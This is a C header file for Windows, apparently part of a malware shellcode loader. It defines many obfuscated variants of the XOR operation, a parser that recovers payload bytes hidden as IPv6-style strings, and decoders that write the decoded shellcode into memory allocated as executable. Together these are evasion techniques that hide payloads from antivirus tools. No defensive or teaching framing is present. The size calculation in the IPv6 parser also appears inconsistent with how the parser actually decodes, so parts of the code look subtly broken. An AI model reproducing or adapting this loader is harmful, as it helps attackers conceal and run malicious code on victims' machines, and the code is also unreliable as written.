#include <intrin.h>
#include <immintrin.h>
#include <cstdlib>
#include <stdio.h>
#include <windows.h>
//#include <stdlib.h>
#include <wincrypt.h>
#include <string.h>
#ifndef XOR_DECODER_H
#define XOR_DECODER_H
#include <stdio.h>
#include <windows.h>
//#include "prototypes.h"
//#include "opaquepredicates.hpp"
// XOR Obfuscation Macros
#define ROTL8(x, n) ((uint8_t)((((uint8_t)(x)) << (n)) | (((uint8_t)(x)) >> (8 - (n)))))
#define ROTR8(x, n) ((uint8_t)((((uint8_t)(x)) >> (n)) | (((uint8_t)(x)) << (8 - (n)))))
#define ROT 3
#define OBFUSCATED_XOR81(a, b) (ROTL8(((uint8_t)(a) | (uint8_t)(b)) & ~((uint8_t)(a) & (uint8_t)(b)), ROT))
#define OBFUSCATED_XOR82(a, b) (ROTR8((~((~(uint8_t)(a) & ~(uint8_t)(b)) & ~((uint8_t)(a) & (uint8_t)(b)))), ROT))
#define OBFUSCATED_XOR83(a, b) (ROTL8((((uint8_t)(a) & ~(uint8_t)(b)) | (~(uint8_t)(a) & (uint8_t)(b))) & ~((uint8_t)(a) & (uint8_t)(b)), ROT))
#define OBFUSCATED_XOR84(a, b) (ROTR8(((((uint8_t)(a) | (uint8_t)(b)) & ~((uint8_t)(a) & (uint8_t)(b))) | ((uint8_t)(a) & ~(uint8_t)(b)) | (~(uint8_t)(a) & (uint8_t)(b))), ROT))
#define OBFUSCATED_XOR85(a, b) (ROTL8(((uint8_t)(a) + (uint8_t)(b) - (((uint8_t)(a) & (uint8_t)(b)) << 1)), ROT))
#define OBFUSCATED_XOR86(a, b) (ROTR8((((uint8_t)(a) | (uint8_t)(b)) - ((uint8_t)(a) & (uint8_t)(b))), ROT))
#define OBFUSCATED_XOR87(a, b) (ROTL8((((uint8_t)(a) | (uint8_t)(b)) * (~((uint8_t)(a) & (uint8_t)(b)) & 1)), ROT))
#define OBFUSCATED_XOR1(a, b) ((a | b) & ~(a & b))
#define OBFUSCATED_XOR2(a, b) (~(~a & ~b) & ~(a & b))
#define OBFUSCATED_XOR3(a, b) (((a & ~b) | (~a & b)) & ~(a & b))
#define OBFUSCATED_XOR4(a, b) (((a | b) & ~(a & b)) | ((a & ~b) | (~a & b)))
#define OBFUSCATED_XOR5(a, b) ((a + b - ((a & b) * 2)))
#define OBFUSCATED_XOR6(a, b) (((a | b) - (a & b)))
#define OBFUSCATED_XOR7(a, b) (((a | b) * (~(a & b) & 1)))
#define OBFUSCATED_XOR8(a, b) (((a | ~b) & (~a | b)))  // Based on De Morgan's laws and XOR identity
#define OBFUSCATED_XOR9(a, b) ((a ^ (a & b)) | (b & ~a))  // Uses XOR and masking
#define OBFUSCATED_XOR10(a, b) (((a | b) ^ (a & b)))  // Common XOR trick from bitwise logic
#define OBFUSCATED_XOR11(a, b) ((~(a & b) & (a | b)))  // XOR via masking shared bits
#define OBFUSCATED_XOR12(a, b) (((a ^ b) & ~(a & b)) | ((~a | ~b) & (a | b)))  // Mixed masking and OR logic
#define OBFUSCATED_XOR13(a, b) ((a ^ b) & ~(~a & ~b))  // Logical filtering of zero bits
#define OBFUSCATED_XOR14(a, b) ((a & ~b) | (~a & b))  // Canonical XOR form
#define SHELLCODE_KEY_SIZE (sizeof(xorKey) / sizeof(xorKey[0]))
#define SHELLCODE_SIZE (sizeof(encodedShellcode) / sizeof(encodedShellcode[0]))
// Function to parse the IPv6 shellcode (removes the colon delimiter)
unsigned char* parse_ipv6_shellcode(const char* ipv6Encoded, DWORD* decodedSize) {
    // Find the length of the original string, excluding colons
    size_t length = strlen(ipv6Encoded);
    *decodedSize = (length - (length / 3));  // Remove colons
    unsigned char* decodedData = (unsigned char*)malloc(*decodedSize);
    if (!decodedData) {
        return NULL;
    }
    size_t dataIndex = 0;
    for (size_t i = 0; i < length; i++) {
        if (ipv6Encoded[i] != ':') {  // Skip the colons
            unsigned int value;
            sscanf(&ipv6Encoded[i], "%2x", &value);
            decodedData[dataIndex++] = (unsigned char)value;
            i++; // Skip next character
        }
    }
    return decodedData;
}
// Function to decode IPv6-encoded shellcode and apply XOR decoding
unsigned char* decode_ipv6_shellcode(const char* ipv6Encoded, const unsigned char* xorKey, size_t keySize) {
    DWORD decodedSize;
    unsigned char* parsedData = parse_ipv6_shellcode(ipv6Encoded, &decodedSize);
    if (!parsedData) {
        printf("IPv6 Shellcode Parsing Failed\n");
        return NULL;
    }
    unsigned char* decoded = (unsigned char*)VirtualAlloc(NULL, decodedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!decoded) {
        printf("Memory Allocation Failed\n");
        free(parsedData);
        return NULL;
    }
    // Apply XOR deobfuscation
    for (size_t i = 0; i < decodedSize; i++) {
        decoded[i] = OBFUSCATED_XOR12(parsedData[i], xorKey[i % keySize]);
    }
    free(parsedData);
    return decoded;
}
unsigned char* decode_shellcode(const unsigned char* encodedShellcode, size_t shellcodeSize,
                                const unsigned char* xorKey, size_t keySize) {
    unsigned char* decoded = (unsigned char*)VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!decoded) {  
        printf("Memory Allocation Failed\n");
        return NULL;
    }

    for (size_t i = 0; i < shellcodeSize; i++) {
        decoded[i] = OBFUSCATED_XOR12(encodedShellcode[i], xorKey[i % keySize]);
    }

    return decoded;
}

#endif // XOR_DECODER_H
